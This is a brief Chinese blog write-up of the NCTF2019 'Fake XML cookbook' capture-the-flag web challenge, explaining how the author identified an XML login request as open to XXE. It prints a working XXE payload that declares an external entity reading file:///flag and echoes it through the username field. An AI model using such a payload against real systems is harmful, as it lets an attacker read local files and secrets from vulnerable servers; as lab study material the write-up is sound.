---
title: [NCTF2019]Fake XML cookbook
date: 2022-07-02 22:27:00
tags:
- web
categories:
- [刷题, web题集]
---

点击进入题目是一个登陆界面

![image-20220702215745447](/image-20220702215745447.png)



结合题目xml时就猜想有没有可能时xxe，抓包看一下

![image-20220702215820564](/image-20220702215820564.png)

果不其然引用了外部实体所以是xxe无疑了

payload：

``` xml-dtd
<!DOCTYPE note [
<!ENTITY admin SYSTEM "file:///flag"> 
]>
<user><username>&admin;</username><password>123</password></user>
```

获得flag：

![image-20220702220019235](/image-20220702220019235.png)

## tip

因为这题有回显所以直接命令执行即可出flag（flag的位置一般ctf题中都是在根目录下所以直接查找/flag即可）